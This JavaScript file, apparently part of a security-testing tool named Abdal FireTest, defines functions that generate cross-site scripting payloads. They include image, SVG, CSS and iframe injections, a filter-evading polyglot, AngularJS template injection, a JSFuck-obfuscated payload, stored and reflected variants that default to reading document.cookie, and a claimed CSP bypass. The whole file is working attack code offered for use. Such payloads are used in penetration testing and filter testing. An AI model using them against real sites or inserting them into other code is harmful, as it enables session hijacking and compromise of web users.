/*
 **********************************************************************
 * -------------------------------------------------------------------
 * Project Name : Abdal FireTest
 * File Name    : XSS.js
 * Author       : Ebrahim Shafiei (EbraSha)
 * Email        : Prof.Shafiei@Gmail.com
 * Created On   : 2023-11-15 14:30:21
 * Description  : Cross-Site Scripting (XSS) payload generator functions
 * -------------------------------------------------------------------
 *
 * "Coding is an engaging and beloved hobby for me. I passionately and insatiably pursue knowledge in cybersecurity and programming."
 * – Ebrahim Shafiei
 *
 **********************************************************************
 */

XSS = {
    selectionToChar: function (dbEngine, txt) {
        var charStringArray = [];
        var decimal;
        for (var c = 0; c < txt.length; c++) {
            decimal = txt.charCodeAt(c);
            charStringArray.push(decimal);
        }

        var charString = '';

        switch (dbEngine) {
            case "stringFromCharCode":
                charString = 'String.fromCharCode(' + charStringArray.join(', ') + ')';
                break;
            case "htmlChar":
                charString = '&#' + charStringArray.join(';&#') + ';';
                break;
        }
        return charString;
    },

    // Basic XSS payload with image tag
    createImageXSS: function(txt) {
        return '<img src="x" onerror="' + txt + '">';
    },

    // DOM-based XSS exploitation
    createDomBasedXSS: function(txt) {
        return '<div onmouseover="' + txt + '">Hover me</div>';
    },

    // SVG-based XSS attack
    createSvgXSS: function() {
        return '<svg onload="alert(1)">';
    },

    // CSS-based XSS attack
    createCssXSS: function() {
        return '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>';
    },

    // Iframe-based XSS payload
    createIframeXSS: function() {
        return '<iframe srcdoc="<script>alert(\'XSS\')</script>"></iframe>';
    },

    // Polyglot XSS that works in multiple contexts
    createPolyglotXSS: function() {
        return 'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>'; 
    },

    // Event handler XSS
    createEventHandlerXSS: function() {
        return 'javascript:alert(1)';
    },

    // AngularJS template injection XSS
    createAngularXSS: function() {
        return '{{constructor.constructor(\'alert(1)\')()}}';
    },

    // JSFuck obfuscated XSS payload
    createJSFuckXSS: function() {
        return '[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]])](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()';
    },
    
    // Stored XSS payload for persistent attacks
    createStoredXSS: function(txt) {
        const payload = txt || "alert(document.cookie)";
        return '<script>setTimeout(function(){' + payload + '}, 2000);</script>';
    },
    
    // Reflected XSS for URL parameter exploitation
    createReflectedXSS: function(txt) {
        const payload = txt || "alert(document.domain)";
        return '"><script>' + payload + '</script>';
    },
    
    // Mutation-based XSS using DOM manipulation
    createMutationXSS: function(txt) {
        const payload = txt || "alert(1)";
        return '<img src=x id="myImage"><script>document.getElementById("myImage").setAttribute("onerror","' + payload + '");document.getElementById("myImage").src="invalid";</script>';
    },
    
    // CSP Bypass techniques
    createCSPBypassXSS: function(txt) {
        const payload = txt || "alert(document.domain)";
        // Using JSONP bypass technique
        return '<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script><script>$.getScript("data:application/javascript,' + encodeURIComponent(payload) + '");</script>';
    }
};